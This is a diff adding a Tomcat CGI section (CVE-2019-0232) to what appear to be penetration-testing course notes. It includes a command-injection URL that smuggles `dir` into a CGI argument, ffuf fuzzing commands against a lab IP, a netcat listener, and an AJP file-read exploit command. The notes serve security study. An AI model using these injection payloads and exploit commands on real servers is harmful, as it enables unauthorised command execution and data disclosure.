@@ -133,3 +133,24 @@ Listner: `nc -lnvp 4443`
 - Versions before 9.0.31, 8.5.51, and 7.0.100
 - https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
 - `[!bash!]$ python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml`
+
+## Tomcat CGI
+
+CVE-2019-0232 is a critical security issue that could result in remote code execution. This vulnerability affects Windows systems that have the enableCmdLineArguments feature enabled. An attacker can exploit this vulnerability by exploiting a command injection flaw resulting from a Tomcat CGI Servlet input validation error, thus allowing them to execute arbitrary commands on the affected system. Versions 9.0.0.M1 to 9.0.17, 8.5.0 to 8.5.39, and 7.0.0 to 7.0.93 of Tomcat are affected.
+
+**Note**: This option should be enabled `enableCmdLineArguments`
+
+`http://example.com/cgi-bin/hello.bat?&dir`
+
+```
+L3pr3ch4un@htb[/htb]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
+L3pr3ch4un@htb[/htb]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
+```
+
+
+
+
+
+
+
+
